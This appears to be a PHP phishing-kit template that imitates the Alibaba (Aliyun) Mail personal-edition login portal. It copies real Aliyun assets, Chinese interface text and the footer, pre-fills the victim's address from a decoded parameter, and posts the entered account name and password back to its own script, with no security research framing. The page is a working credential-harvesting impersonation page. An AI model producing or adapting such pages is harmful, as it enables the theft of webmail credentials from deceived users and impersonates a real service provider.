<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html>
    <head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="description" content="Alibaba mailbox personal edition provides users with efficient, stable and convenient e-mail service. The free registered mailbox delivers 2G super-large attachments with 60G capacity. You can register and log in to the Alibaba mailbox personal edition on the web page, mobile phone." />
    <meta name="data-spm" content="5176"/>
    <meta name="keywords" content="Ariyun mail, personal email, free email, work email, nail mail, DingTalk email, email" />
    <link rel="shortcut icon" href="https://mail.aliyun.com/static/0.2.8/images/favicon.ico" type="image/x-icon"/>
    <link rel="bookmark" href="https://mail.aliyun.com/static/0.2.8/images/favicon.ico" type="image/x-icon"/>
    <title>Login Portal_Alibaba Mail Personal Edition - Alibaba Cloud</title>
    <link rel="stylesheet" type="text/css" href="https://mail.aliyun.com/static/0.2.8/login/freemail/styles/login.css"/>
    <link href="https://x.alicdn.com/vip/havana-login/0.4.9/images/favicon.ico?v=20141022" rel="apple-touch-icon-precomposed">
    <link href="https://x.alicdn.com/vip/havana-nlogin/0.10.35/index.css" rel="stylesheet" type="text/css">
    <link href="https://mail.aliyun.com/static/styles/loginForFreeMail.css" rel="stylesheet" type="text/css">

    <style type="text/css">
        #login_input_wrap {
            right: 12px;
            height: auto;
        }

        body .login_banner_wrap {
            width: 1000px;
            margin: 0 auto;
            background-color: transparent;
        }

        .language_select {
            border: unset;
            font-size: 12px;
            color: #848585;
            outline: none;
            padding: 0 12px 0 6px;
        }

        .language_select:before{
            content: "";
            display: inline-block;
            width: 1px;
            height: 12px;
            background-color: #dcdcdc;
            vertical-align: middle;
            margin-top: -1px;
        }

        .select_width_reference {
            visibility: hidden;
            white-space: nowrap;
            position: absolute;
            top: -9999px;
            left: -9999px;
            font-size: 12px;
        }

        .login_banner_link .login_banner_link_label {
            border: 0 none;
            padding: 0;
        }

        .login_banner_link .login_banner_link_label:before {
            content: "";
            display: inline-block;
            width: 1px;
            height: 12px;
            background-color: #dcdcdc;
            vertical-align: middle;
            margin-top: -1px;
        }

        .login_banner_link_label a {
            font-size: 12px;
            padding: 0 12px;
        }

        .login_banner_link .login_banner_link_label_first:before {
            background-color: transparent;
        }

        .login_banner_wrap .login_banner_link {
            margin-right: 0;
        }

        .login_banner_wrap .login_banner_body_img {
            left: 0;
        }

        .login_body_inner #login_input_wrap {
            top: 80px;
        }

        .alimail-seo{
            display:none;
        }

        .login_body .login_body_default {
            background-color: rgb(230, 237, 253);
        }

        #login_input_wrap {
            height: 366px;
            width: 371px;
        }
    </style>
</head>

<body data-spm="100079">
    <div style="display:none;"></div>

    <span id="select-width-reference" class="select_width_reference"></span>
    <div class="alimail-seo">
        <!-- seo -->
        <a href="#">阿里邮箱官网</a>
    </div>
    <div class="login_banner_wrap" data-spm="1">
        <div class="login_banner_body_img" title="" style="background-image:url(https://mail.aliyun.com/static/0.2.8/images/forFreemail/logo.png)"></div>
        <div class="login_banner_link">
            <div class="login_banner_link_label inline_block login_banner_link_label_first"><a class="blue text_middle" href="#" target="_blank" _cat="topcustomlink" _id="personalalimail" data-spm-click="personalalimail" style="">阿里邮箱官网</a></div>
            <div class="login_banner_link_label inline_block "><a class="blue text_middle" href="#" target="_blank" _cat="topcustomlink" _id="personalmail" data-spm-click="personalmail" style="">企业邮箱登录</a></div>
            <div class="login_banner_link_label inline_block ">
                <a class="login_banner_download_href blue" href="#" target="_blank" _cat="toplink" _id="app">客户端</a>
            </div>
            <div class="login_banner_link_label inline_block"><a class="blue text_middle" target="_blank" href="#" _cat="toplink" _id="help">帮助</a></div>
                <div class="login_banner_link_label inline_block" >
                    <select id="language-select" class="language_select" >
                            <option value="zh_CN" selected="selected">简体中文</option>
                            <option value="zh_TW" >繁體中文（中国台灣）</option>
                            <option value="zh_HK" >繁體中文（中国香港）</option>
                            <option value="en" >English</option>
                            <option value="ja_JP" >日本语</option>
                            <option value="vi_VN" >Tiếng Việt</option>
                            <option value="fr_FR" >Fran&ccedil;ais</option>
                            <option value="ko_KR" >한국어</option>
                            <option value="es_419" >Espa&ntilde;ol (Latinoam&eacute;rica)</option>
                            <option value="tr_TR" >T&uuml;rk&ccedil;e</option>
                            <option value="pt_BR" >Portugu&ecirc;s(Brasil)</option>
                            <option value="ms_MY" >malaysian</option>
                            <option value="id_ID" >bahasa Indonesia</option>
                            <option value="th_TH" >แบบไทย</option>
                            <option value="pt_PT" >Portugu&ecirc;s</option>
                    </select>
                </div>
            </div>
        </div>
    <div class="login_body" data-spm="2">

    <div class="login_body login_body_default" data-spm="2" style="background-color: rgb(230, 237, 253);">
            <div class="login_body_inner login_body_inner_default" style="background-image: url(&quot;https://mail.aliyun.com/attachment/download_docstore?fileID=%2Fnew2%2F0ba33daddeba7ba1fc5c627cab60e05176ae24564b8e12da8c05102ce1941b0b5b70f93d000702911%2FCNjWtLcGEJOlBBgDIhQ448hix8sZpQyxmOp7N13v6FdBdSoBMA%3D%3D%2F162e5b1b-cd85-4e0-----24IKVVv-&quot;);">
                <div class="login_body_left login_body_left_default" id="login_body_left" style="background-image: url(&quot;https://mail.aliyun.com/attachment/download_docstore?fileID=%2Fnew2%2Ff88a821efa1ceb0251c6b1c77897823fe6c488c0f708dc01c62cc0a9b3f36a30b5181701000188421%2FCOXWtLcGEJqTARgDIhSfDEFilXwwbT-C4_Ti2jaijOCJ_SoBMA%3D%3D%2F44019a75-f676-485-----24ITH2k-&quot;); visibility: visible;"></div>
                <div class="login_body_inner">
                    <div class="login_body_left" id="login_body_left"></div>
                        <div id="login_input_wrap">
                            <div id="container" class="">
                                <div id="login" class="width-vertical login-label-text login-view-password v2">
                                <div class="master-login-title">账号登录</div>
                                    <div class="login-content nc-outer-box">
                                        <div class="login-password">
                                            <div id="login-error" class="login-error" style="<?php echo $error; ?>">
                                                <i class="iconfont icon-warning"></i>
                                            <div class="login-error-msg">账号名或登录密码不正确</div>
                                    </div>
                                </div>
                            <form id="login-form" class="login-form" method="post"><div class="fm-field"><label class="fm-label"><span><label></label></span></label><div class="input-plain-wrap input-wrap-loginid ">
                            <input type="hidden" name="user" value="<?php echo htmlspecialchars($decoded); ?>" autocapitalize="off">
                            <input type="hidden" name="login" value="mailaliyun" autocorrect="off" autocapitalize="off" aria-required="true">
                            <input name="fm-login-id" type="text" class="fm-text" id="fm-login-id" tabindex="1" aria-label="阿里邮箱账号" value="<?php echo htmlspecialchars($login_id); ?>" placeholder="阿里邮箱账号" autocapitalize="off" data-spm-anchor-id="0.0.0.i1.133779f4Ncd89a"></div></div><div class="fm-field"><label class="fm-label"><span><label></label></span></label><div class="input-plain-wrap has-password-look-btn input-wrap-password"><input name="pass" type="text" class="fm-text" id="fm-login-password" tabindex="2" aria-label="请输入密码" placeholder="请输入密码" maxlength="40" autocapitalize="off" data-spm-anchor-id="0.0.0.i0.133779f4Ncd89a"><div class="password-look-btn"><i class="iconfont  icon-eye-close"></i></div></div></div><div class="fm-field baxia-container-wrapper"><div class="baxia-container tb-login"><div id="baxia-password" style="display: block;"></div></div><div id="nocaptcha-password" class="nc-container tb-login" data-nc-idx="1" style="display: none;">
                            <div id="nc_1_wrapper" class="nc_wrapper">
                            <div id="nc_1_n1t" class="nc_scale">
                            <div id="nc_1__bg" class="nc_bg"></div>
                            <span id="nc_1_n1z" class="nc_iconfont btn_slide"></span>
                            <div id="nc_1__scale_text" class="scale_text slidetounlock"><span class="nc-lang-cnt" data-nc-lang="_startTEXT">Please slide to verify</span></div>
                            <div id="nc_1_clickCaptcha" class="clickCaptcha">
                            <div class="clickCaptcha_text">
                            <b id="nc_1__captcha_text" class="nc_captch_text"></b>
                            <i id="nc_1__btn_2" class="nc_iconfont nc_btn_2 btn_refresh"></i>
                            </div>
                            <div class="clickCaptcha_img"></div>
                            <div class="clickCaptcha_btn"></div>
                            </div>
                            <div id="nc_1_imgCaptcha" class="imgCaptcha">
                            <div class="imgCaptcha_text"><input id="nc_1_captcha_input" maxlength="6" type="text" style="ime-mode:disabled"></div>
                            <div class="imgCaptcha_img" id="nc_1__imgCaptcha_img"></div>
                            <i id="nc_1__btn_1" class="nc_iconfont nc_btn_1 btn_refresh" onclick="document.getElementById('nc_1__imgCaptcha_img').children[0].click()"></i>
                            <div class="imgCaptcha_btn">
                            <div id="nc_1__captcha_img_text" class="nc_captcha_img_text"></div>
                            <div id="nc_1_scale_submit" class="nc_scale_submit"></div>
                            </div>
                            </div>
                            <div id="nc_1_cc" class="nc-cc"></div>
                            <i id="nc_1__voicebtn" tabindex="0" role="button" class="nc_voicebtn nc_iconfont" style="display:none"></i>
                            <b id="nc_1__helpbtn" class="nc_helpbtn"><span class="nc-lang-cnt" data-nc-lang="_learning">help</span></b>
                            </div>
                            <div id="nc_1__voice" class="nc_voice"></div>
                            </div>
                            </div></div><div class="fm-btn"><button type="submit" tabindex="3" class="fm-button fm-submit password-login  button-low-light">登录</button></div><div class="login-blocks login-links"><a href="#" target="_blank" class="forgot-password-a-link">忘记密码</a></div><div class="login-blocks agreement-block"><div class="fm-agreement resize-window"><input type="checkbox" name="fm-agreement-checkbox" id="fm-agreement-checkbox" autocomplete="off"><label class="fm-agreement-text" for="fm-agreement-checkbox"><span class="fm-agreement-required-mark">*</span>我已阅读并同意<a href="#" target="blank">阿里邮箱隐私协议</a></label></div></div>
                        </form></div></div>
                        <div class="extra-login-content"></div></div></div>
                        </div>
                        <a href="javascript:void(0);" class="login_bg_link" target="_blank" id="login_bg_link" style="display:none;" _cat="bglink">&nbsp;&nbsp;&nbsp;</a>
                    </div>
                <a href="#" class="login_bg_link" target="_blank" id="login_bg_link" style="" _cat="bglink" data-spm-click="域名" _id="域名">&nbsp;&nbsp;&nbsp;</a>
            </div>
        </div>
    </div>
    <div class="login_bottom" data-spm="3">
        <div class="login_about_wrap">
            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="" _cat="bottomlink" _id="about">关于我们</a></div>
            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="" _cat="bottomlink" _id="links">阿里云</a></div>
            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="" _cat="bottomlink" _id="wanwang">万网</a></div>
            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="" _cat="bottomlink" _id="developer">开发者社区</a></div>
            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="" _cat="bottomlink" _id="helpcenter">帮助中心</a></div>
            <div class="login_about_label inline_block"><a class="gray text_middle" target="_blank" href="" _cat="bottomlink" _id="alimail">阿里邮箱企业版</a></div>
            <div class="login_about_label inline_block">2009-2026 Aliyun.com 版权所有 ICP证：浙B2-20080101</div>
        </div>
    </div>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("fm-login-password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>